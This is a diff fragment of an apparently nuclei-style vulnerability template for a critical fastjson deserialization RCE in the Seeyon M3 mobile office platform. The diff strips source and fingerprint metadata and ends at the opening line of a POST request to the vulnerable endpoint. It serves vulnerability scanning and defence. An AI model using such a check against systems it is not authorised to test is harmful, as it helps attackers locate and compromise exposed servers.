@@ -3,14 +3,8 @@ info:
   name: 致远M3移动智能办公平台fastjson反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/25f562425e49d6329126a742e0ef91f7
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 25f562425e49d6329126a742e0ef91f7
-    fofa: + hunter`web.icon=="657d4895205951cbea6396701b194c30"`
 http:
 - raw:
   - 'POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1
